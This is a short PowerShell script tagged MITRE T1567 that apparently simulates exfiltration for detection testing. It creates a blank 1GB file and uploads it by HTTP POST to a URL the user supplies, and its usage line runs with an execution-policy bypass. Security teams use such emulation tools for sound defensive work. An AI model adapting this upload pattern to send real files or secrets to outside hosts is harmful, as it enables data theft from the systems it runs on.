<#
    T1567 - Exfiltration Over Web Service
    Create a 1GB file and upload it to an url of your choice 
#>

param (
    [Parameter(Mandatory=$false)]
    [string]$url
)

Start-Transcript -Path "$env:tmp\simulation_traces.log" -Append -Force

if (-not $url){
    Write-Host -ForegroundColor Red "Error: You must provide an url as argument to send data to.`nExample usage: powershell -ep Bypass -File exfiltrate_data_http.ps1 -url `"https://example.com/upload.php`""
    exit 1
}

try {
        
    Write-Host -ForegroundColor Cyan "Creating file with 1GB size"
    $filePath = "$env:tmp\exfiltration.dat"
    $f = new-object System.IO.FileStream $filePath, Create, ReadWrite
    $f.SetLength(1GB)
    $f.Close()
    if ((Get-Item $filePath).Length -eq 1GB){
        Write-Host -ForegroundColor Green "Success: File $filePath created with size of 1GB"
        Invoke-WebRequest -Uri $url -Method POST -InFile $filePath -Verbose
        Remove-Item $filePath -Verbose -Force
    }
    else{
        Write-Host -ForegroundColor Red "Error: Cannot create $filePath with size of 1GB"
    }
}
catch {
    Write-Host -ForegroundColor Red "`nErorr: $_"
}

Stop-Transcript
